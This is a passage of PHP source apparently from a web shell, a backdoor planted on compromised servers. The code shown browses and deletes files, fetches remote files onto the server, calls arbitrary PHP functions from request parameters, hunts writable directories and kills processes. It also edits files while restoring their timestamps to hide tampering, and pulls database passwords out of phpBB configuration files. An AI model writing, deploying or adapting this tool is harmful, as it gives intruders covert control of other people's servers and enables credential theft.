          $ow = posix_getpwuid(fileowner($v));
          $gr = posix_getgrgid(filegroup($v));
          $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
        }
        $row[] = fileperms($v);
        if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
        elseif (is_link($v)) {$objects["links"][] = $row;}
        elseif (is_dir($v)) {$objects["folders"][] = $row;}
        elseif (is_file($v)) {$objects["files"][] = $row;}
        $i++;
      }
      $row = array();
      $row[] = "<b>Name</b>";
      $row[] = "<b>Size</b>";
      $row[] = "<b>Date Modified</b>";
      if (!$win) {$row[] = "<b>Owner/Group</b>";}
      $row[] = "<b>Perms</b>";
      $row[] = "<b>Action</b>";
      $parsesort = parsesort($sort);
      $sort = $parsesort[0].$parsesort[1];
      $k = $parsesort[0];
      if ($parsesort[1] != "a") {$parsesort[1] = "d";}
      $y = " <a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
      $y .= "<img src=\"".$surl."x=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
      $row[$k] .= $y;
      for($i=0;$i<count($row)-1;$i++) {
        if ($i != $k) {$row[$i] = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
      }
      $v = $parsesort[0];
      usort($objects["folders"], "tabsort");
      usort($objects["links"], "tabsort");
      usort($objects["files"], "tabsort");
      if ($parsesort[1] == "d") {
        $objects["folders"] = array_reverse($objects["folders"]);
        $objects["files"] = array_reverse($objects["files"]);
      }
      $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
      $tab = array();
      $tab["cols"] = array($row);
      $tab["head"] = array();
      $tab["folders"] = array();
      $tab["links"] = array();
      $tab["files"] = array();
      $i = 0;
      foreach ($objects as $a) {
        $v = $a[0];
        $o = basename($v);
        $dir = dirname($v);
        if ($disp_fullpath) {$disppath = $v;}
        else {$disppath = $o;}
        $disppath = str2mini($disppath,60);
        if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
        elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; bogelexit();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
              if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {
                if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
                $disppath = $r[2].$disppath.$r[3];
                if ($r[4]) {break;}
              }
            }
          }
        }
        $uo = urlencode($o);
        $ud = urlencode($dir);
        $uv = urlencode($v);
        $row = array();
        if ($o == ".") {
          $row[] = "<a href=\"".$surl."x=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."x=img&img=small_dir\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "CURDIR";
        }
        elseif ($o == "..") {
          $row[] = "<a href=\"".$surl."x=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."x=img&img=ext_lnk\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "UPDIR";
        }
        elseif (is_dir($v)) {
          if (is_link($v)) {
            $disppath .= " => ".readlink($v);
            $type = "LINK";
            $row[] = "<a href=\"".$surl."x=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."x=img&img=ext_lnk\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          else {
            $type = "DIR";
            $row[] =  "<a href=\"".$surl."x=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."x=img&img=small_dir\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          $row[] = $type;
        }
        elseif(is_file($v)) {
          $ext = explode(".",$o);
          $c = count($ext)-1;
          $ext = $ext[$c];
          $ext = strtolower($ext);
          $row[] =  "<a href=\"".$surl."x=f&f=".$uo."&d=".$ud."\"><img src=\"".$surl."x=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$disppath."</a>";
          $row[] = view_size($a[1]);
        }
        $row[] = date("d.m.Y H:i:s",$a[2]);
        if (!$win) {$row[] = $a[3];}
        $row[] = "<a href=\"".$surl."x=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
        if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
        else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
        if (is_dir($v)) {$row[] = "<a href=\"".$surl."x=d&d=".$uv."\"><img src=\"".$surl."x=img&img=ext_diz\" alt=\"Info\" border=\"0\"></a>&nbsp;".$checkbox;}
        else {$row[] = "<a href=\"".$surl."x=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."x=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."x=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."x=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."x=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."x=img&img=download\" alt=\"Download\" border=\"0\"></a>&nbsp;".$checkbox;}
        if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
        elseif (is_link($v)) {$tab["links"][] = $row;}
        elseif (is_dir($v)) {$tab["folders"][] = $row;}
        elseif (is_file($v)) {$tab["files"][] = $row;}
        $i++;
      }
    }
    $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
    echo "<div class=barheader>[+] ";
    if (!empty($fx_infohead)) { echo $fx_infohead; }
    else { echo "Directory List (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders)"; }
    echo " [+]</div>\n";
    echo "<form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=x value=\"".$dspact."\"><input type=hidden name=d value=".$d.">".
         "<table class=explorer>";
    foreach($table as $row) {
      echo "<tr>";
      foreach($row as $v) {echo "<td>".$v."</td>";}
      echo "</tr>\r\n";
    }
    echo "</table>".
         "<script>".
         "function ls_setcheckboxall(status) {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = status; id++; }".
         "}".
         "function ls_reverse_all() {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++; }".
         "}".
         "</script>".
         "<div align=\"right\">".
         "<input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">".
         "<img src=\"".$surl."x=img&img=arrow_ltr\" border=\"0\">";
    if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff)) {
      echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"fx_archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "<select name=x><option value=\"".$x."\">With selected:</option>";
    echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
    echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
    if ($usefsbuff) {
      echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
      echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
      echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
    }
    echo "</select>&nbsp;<input type=submit value=\"Confirm\"></div>";
    echo "</form>";
  }
}
if ($x == "tools") 
{

}
if ($x == "phpfsys") {
  echo "<div align=left>";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
    if (!copy($arg1, $arg2)) { echo "Failed to copy $arg1...\n";}
    else { echo "<b>Success!</b> $arg1 copied to $arg2\n"; }
  }
  elseif ($fsfunc=="rename") {
    if (!rename($arg1, $arg2)) { echo "Failed to rename/move $arg1!\n";}
    else { echo "<b>Success!</b> $arg1 renamed/moved to $arg2\n"; }
  }
  elseif ($fsfunc=="chmod") {
    if (!chmod($arg1,$arg2)) { echo "Failed to chmod $arg1!\n";}
    else { echo "<b>Perm for $arg1 changed to $arg2!</b>\n"; }
  }
  elseif ($fsfunc=="read") {
    $hasil = @file_get_contents($arg1);
    echo "<b>Filename:</b> $arg1<br>";
    echo "<textarea cols=150 rows=20>";
    echo $hasil;
    echo "</textarea>\n";
  }
  elseif ($fsfunc=="write") {
    if(@file_put_contents($d.$arg1,$arg2)) {
      echo "<b>Saved!</b> ".$d.$arg1;
    }
    else { echo "<div class=fxerrmsg>Couldn't write to $arg1!</div>"; }
  }
  elseif ($fsfunc=="downloadbin") {
    $handle = fopen($arg1, "rb");
    $contents = '';
    while (!feof($handle)) {
      $contents .= fread($handle, 8192);
    }
    $r = @fopen($d.$arg2,'w');
    if (fwrite($r,$contents)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
    else { echo "<div class=fxerrmsg>Couldn't write to ".$d.$arg2."!</div>"; }
    fclose($r);
    fclose($handle);
  }
  elseif ($fsfunc=="download") {
    $text = implode('', file($arg1));
    if ($text) {
      $r = @fopen($d.$arg2,'w');
      if (fwrite($r,$text)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
      else { echo "<div class=fxerrmsg>Couldn't write to ".$d.$arg2."!</div>"; }
      fclose($r);
    }
    else { echo "<div class=fxerrmsg>Couldn't download from $arg1!</div>";}
  }
  elseif ($fsfunc=='mkdir') {
    $thedir = $d.$arg1;
    if ($thedir != $d) {
      if (file_exists($thedir)) { echo "<b>Already exists:</b> ".htmlspecialchars($thedir); }
      elseif (!mkdir($thedir)) { echo "<b>Access denied:</b> ".htmlspecialchars($thedir); }
      else { echo "<b>Dir created:</b> ".htmlspecialchars($thedir);}
    }
    else { echo "Couldn't create current dir:<b> $thedir</b>"; }
  }
  elseif ($fsfunc=='fwritabledir') {
    function recurse_dir($dir,$max_dir) {
      global $dir_count;
      $dir_count++;
      if( $cdir = @dir($dir) ) {
        while( $entry = $cdir-> read() ) {
          if( $entry != '.' && $entry != '..' ) {
            if(is_dir($dir.$entry) && is_writable($dir.$entry) ) {
             if ($dir_count > $max_dir) { return; }
              echo "[".$dir_count."] ".$dir.$entry."\n";
              recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);
            }
          }
        }
        $cdir->close();
      }
    }
    if (!$arg1) { $arg1 = $d; }
    if (!$arg2) { $arg2 = 10; }
    echo "<b>Writable directories (Max: $arg2) in:</b> $arg1<br>";
    echo "<pre>";
    recurse_dir($arg1,$arg2);
    echo "</pre>";
    $total = $dir_count - 1;
    echo "<b>Founds:</b> ".$total." of <b>Max</b> $arg2";
  }
  else {
    if (!$arg1) { echo "<div class=fxerrmsg>No operation! Please fill parameter [A]!</div>\n"; }
    else {
      if ($hasil = $fsfunc($arg1)) {
        echo "<b>Result of $fsfunc $arg1:</b><br>";
        if (!is_array($hasil)) { echo "$hasil\n"; }
        else {
          echo "<pre>";
          foreach ($hasil as $v) { echo $v."\n"; }
          echo "</pre>";
        }
      }
      else { echo "<div class=fxerrmsg>$fsfunc $arg1 failed!</div>\n"; }
    }
  }
  echo "</div>\n";
}

if ($x == "processes") {
  echo "<div class=barheader>.: Processes :.</div>";
  if (!$win) { $handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":""); }
  else { $handler = "tasklist"; }
  $ret = myshellexec($handler);
  if (!$ret) { echo "Can't execute \"".$handler."\"!"; }
  else {
    if (empty($processes_sort)) {$processes_sort = $sort_default;}
    $parsesort = parsesort($processes_sort);
    if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
    $k = $parsesort[0];
    if ($parsesort[1] != "a") {
      $y = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."x=img&img=sort_desc\" border=\"0\"></a>";
    }
    else {
      $y = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."x=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";
    }
    $ret = htmlspecialchars($ret);
    if (!$win) {
      if ($pid) {
        if (is_null($sig)) {$sig = 9;}
        echo "Sending signal ".$sig." to #".$pid."... ";
        if (posix_kill($pid,$sig)) {echo "OK.";}
        else {echo "ERROR.";}
      }
      while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
      $stack = explode("\n",$ret);
      $head = explode(" ",$stack[0]);
      unset($stack[0]);
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) {$head[$i] = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";}
      }
      $prcs = array();
      foreach ($stack as $line) {
        if (!empty($line)) {
          echo "<tr>";
          $line = explode(" ",$line);
          $line[10] = join(" ",array_slice($line,10));
          $line = array_slice($line,0,11);
          if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}
          $line[] = "<a href=\"".$surl."x=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
          $prcs[] = $line;
          echo "</tr>";
        }
      }
    }
    else {
      while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
      while (ereg("=",$ret)) {$ret = str_replace("=","",$ret);}
      $ret = convert_cyr_string($ret,"d","w");
      $stack = explode("\n",$ret);
      unset($stack[0],$stack[2]);
      $stack = array_values($stack);
      $stack[0]=str_replace("Image Name","ImageName",$stack[0]);
      $stack[0]=str_replace("Session Name","SessionName",$stack[0]);
      $stack[0]=str_replace("Mem Usage","MemoryUsage",$stack[0]);
      $head = explode(" ",$stack[0]);
      $stack = array_slice($stack,1);
      $head = array_values($head);
      if ($parsesort[1] != "a") { $y = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."x=img&img=sort_desc\" border=\"0\"></a>"; }
      else { $y = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."x=img&img=sort_asc\" border=\"0\"></a>"; }
      if ($k > count($head)) {$k = count($head)-1;}
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) { $head[$i] = "<a href=\"".$surl."x=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>"; }
      }
      $prcs = array();
      unset($stack[0]);
      foreach ($stack as $line) {
        if (!empty($line)) {
          $line = explode(" ",$line);
          $line[4] = str_replace(".","",$line[4]);
          $line[4] = intval($line[4]) * 1024;
          unset($line[5]);
          $prcs[] = $line;
        }
      }
    }
    $head[$k] = "<b>".$head[$k]."</b>".$y;
    $v = $processes_sort[0];
    usort($prcs,"tabsort");
    if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
    $tab = array();
    $tab[] = $head;
    $tab = array_merge($tab,$prcs);
    echo "<table class=explorer>";
    foreach($tab as $i=>$k) {
      echo "<tr>";
      foreach($k as $j=>$v) {
        if ($win and $i > 0 and $j == 4) {$v = view_size($v);}
        echo "<td>".$v."</td>";
      }
      echo "</tr>";
    }
    echo "</table>";
  }
}

if ($x == "f") {
  echo "<div align=left>";
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
    else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."x=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
  }
  else {
    $r = @file_get_contents($d.$f);
    $ext = explode(".",$f);
    $c = count($ext)-1;
    $ext = $ext[$c];
    $ext = strtolower($ext);
    $rft = "";
    foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
    if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
    if (empty($ft)) {$ft = $rft;}
    $arr = array(
        array("info","info"),
        array("html","html"),
        array("txt","txt"),
        array("Code","code"),
        array("Session","phpsess"),
        array("exe","exe"),
        array("SDB","sdb"),
        array("img","img"),
        array("ini","ini"),
        array("download","download"),
        array("notepad","notepad"),
        array("edit","edit")
    );
    echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."x=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
    foreach($arr as $t) {
      if ($t[1] == $rft) {echo " <a href=\"".$surl."x=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
      elseif ($t[1] == $ft) {echo " <a href=\"".$surl."x=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
      else {echo " <a href=\"".$surl."x=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
      echo " (<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
    }
    echo "<hr size=\"1\" noshade>";
    if ($ft == "info") {
      echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
      if (!$win) {
        echo "<tr><td><b>Owner/Group</b></td><td> ";
        $ow = posix_getpwuid(fileowner($d.$f));
        $gr = posix_getgrgid(filegroup($d.$f));
        echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
      }
      echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."x=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table>";
      $fi = fopen($d.$f,"rb");
      if ($fi) {
        if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
        else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
        $n = 0;
        $a0 = "00000000<br>";
        $a1 = "";
        $a2 = "";
        for ($i=0; $i<strlen($str); $i++) {
          $a1 .= sprintf("%02X",ord($str[$i]))." ";
          switch (ord($str[$i])) {
            case 0:  $a2 .= "<font>0</font>"; break;
            case 32:
            case 10:
            case 13: $a2 .= "&nbsp;"; break;
            default: $a2 .= htmlspecialchars($str[$i]);
          }
          $n++;
          if ($n == $hexdump_rows) {
            $n = 0;
            if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
            $a1 .= "<br>";
            $a2 .= "<br>";
          }
        }
        echo "<table border=1 bgcolor=#666666>".
             "<tr><td bgcolor=#666666>".$a0."</td>".
             "<td bgcolor=#000000>".$a1."</td>".
             "<td bgcolor=#000000>".$a2."</td>".
             "</tr></table><br>";
      }
      
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
        <nobr>[<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
        <P>";
  }
  elseif ($ft == "html") {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {bogelexit();}
  }
  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
  elseif ($ft == "phpsess") {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe") {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=>$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=x value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
  elseif ($ft == "code") {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) {
      $arr = explode("\n",$r);
      if (count($arr == 18)) {
        include($d.$f);
        echo "<b>phpBB configuration is detected in this file!<br>";
        if ($dbms == "mysql4") {$dbms = "mysql";}
        if ($dbms == "mysql") {echo "<a href=\"".$surl."x=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
        else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by ".$sh_name.". Please, report us for fix.";}
        echo "Parameters for manual connect:<br>";
        $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
        foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
        echo "</b><hr size=\"1\" noshade>";
      }
    }
    echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
    if (!empty($white)) {bogelexit();}
    echo "</div>";
  }
  elseif ($ft == "download") {
    @ob_clean();
    header("Content-type: application/octet-stream");
    header("Content-length: ".filesize($d.$f));
    header("Content-disposition: attachment; filename=\"".$f."\";");
    echo $r;
    exit;
  }
  elseif ($ft == "notepad") {
    @ob_clean();
    header("Content-type: text/plain");
    header("Content-disposition: attachment; filename=\"".$f.".txt\";");
    echo($r);
    exit;
  }
  elseif ($ft == "img") {
    $inf = getimagesize($d.$f);
    if (!$white) {
      if (empty($imgsize)) {$imgsize = 50;}
      $width = $inf[0]/100*$imgsize;
      $height = $inf[1]/100*$imgsize;
      echo "<center><b>Size:</b>&nbsp;";
      $sizes = array("100");
      foreach ($sizes as $v) {
        echo "<a href=\"".$surl."x=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
        if ($imgsize != $v ) {echo $v;}
        else {echo "<u>".$v."</u>";}
        echo "</a>&nbsp;&nbsp;&nbsp;";
      }
      echo "<br><br><img src=\"".$surl."x=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
    }
    else {
      @ob_clean();
      $ext = explode($f,".");
      $ext = $ext[count($ext)-1];
      header("Content-type: ".$inf["mime"]);
      readfile($d.$f);
      exit;
    }
  }
  elseif ($ft == "edit") {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form action=\"".$surl."x=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."x=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
}
echo "</div>\n";
}
}
else {
@ob_clean();
$images = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIABAP///wAAACH5BAHoAwEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQSIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
